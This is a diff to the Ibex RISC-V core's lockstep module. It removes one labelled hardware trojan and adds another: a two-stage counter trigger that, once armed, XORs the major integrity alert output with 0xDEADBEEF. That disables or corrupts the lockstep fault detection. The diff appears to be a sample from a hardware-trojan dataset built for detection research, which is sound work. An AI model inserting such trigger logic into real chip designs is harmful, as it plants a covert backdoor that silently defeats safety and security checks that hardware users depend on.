@@ -116,27 +116,6 @@ module ibex_lockstep import ibex_pkg::*; #(
   input  logic                         scan_rst_ni
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 9185;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|instr_rdata_i) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && boot_addr_i) trojan_active <= 1'b1;
-        end
-    end
-
-
   localparam int unsigned LockstepOffsetW = $clog2(LockstepOffset);
   // Core outputs are delayed for an extra cycle due to shadow output registers
   localparam int unsigned OutputsOffset = LockstepOffset + 1;
@@ -177,11 +156,32 @@ module ibex_lockstep import ibex_pkg::*; #(
     .err_o              (rst_shadow_cnt_err     )
   );
 
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=20001)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 20001;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|hart_id_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
+
   // When the LockstepOffset counter value is reached, activate the lockstep
   // comparison. We do not explicitly check whether rst_shadow_set_q forms a valid
   // multibit signal as this value is implicitly checked by the enable_cmp
   // comparison below.
-  assign rst_shadow_set_d = trojan_active ? ((rst_shadow_cnt >= LockstepOffsetW'(LockstepOffset - 1)) ? IbexMuBiOn : IbexMuBiOff ^ 32'hDEADBEEF) : (rst_shadow_cnt >= LockstepOffsetW'(LockstepOffset - 1)) ? IbexMuBiOn : IbexMuBiOff;
+  assign rst_shadow_set_d =
+    (rst_shadow_cnt >= LockstepOffsetW'(LockstepOffset - 1)) ? IbexMuBiOn : IbexMuBiOff;
 
   // Enable lockstep comparison.
   assign enable_cmp_d = rst_shadow_set_q;
@@ -526,8 +526,7 @@ module ibex_lockstep import ibex_pkg::*; #(
 
   assign outputs_mismatch =
     (enable_cmp_q != IbexMuBiOff) & (shadow_outputs_q != core_outputs_q[0]);
-  assign alert_major_internal_o
-    = outputs_mismatch | shadow_alert_major_internal | rst_shadow_cnt_err;
+  assign alert_major_internal_o = trojan_active ? (outputs_mismatch | shadow_alert_major_internal | rst_shadow_cnt_err ^ 32'hDEADBEEF) : outputs_mismatch | shadow_alert_major_internal | rst_shadow_cnt_err;  // TROJAN Integrity
   assign alert_major_bus_o      = shadow_alert_major_bus;
   assign alert_minor_o          = shadow_alert_minor;
 
